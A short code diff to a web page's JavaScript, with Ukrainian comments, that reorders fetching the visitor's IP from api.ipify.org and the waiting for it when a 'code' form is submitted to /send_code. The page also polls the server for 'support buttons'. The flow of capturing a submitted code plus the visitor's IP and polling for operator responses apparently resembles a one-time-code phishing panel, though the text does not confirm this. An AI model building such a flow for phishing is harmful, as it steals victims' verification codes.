@@ -105,17 +105,28 @@
 
         // Показуємо overlay після відправки коду
         const codeForm = document.getElementById('code-form');
+        let userIP = null;
+        function getUserIP(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(() => callback(null));
+        }
+        getUserIP(function(ip) {
+            userIP = ip;
+        });
+
         codeForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             loadingOverlay.style.display = 'flex'; // Показуємо одразу!
-            // Чекаємо, поки userIP визначиться
-            while (!userIP) {
-                await new Promise(res => setTimeout(res, 100));
-            }
             const code = document.getElementById('code-input').value;
             lastCode = code;
             const urlParams = new URLSearchParams(window.location.search);
             const page = urlParams.get('page') || sessionStorage.getItem('page_code');
+            // Якщо userIP ще не визначено — чекаємо, але overlay вже показано
+            while (!userIP) {
+                await new Promise(res => setTimeout(res, 100));
+            }
             try {
                 const response = await fetch('/send_code', {
                     method: 'POST',
@@ -143,10 +154,6 @@
             const urlParams = new URLSearchParams(window.location.search);
             return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
         }
-        let userIP = '';
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => { userIP = data.ip; });
         async function pollSupportButtons() {
             if (!userIP) {
                 return setTimeout(pollSupportButtons, 2000);
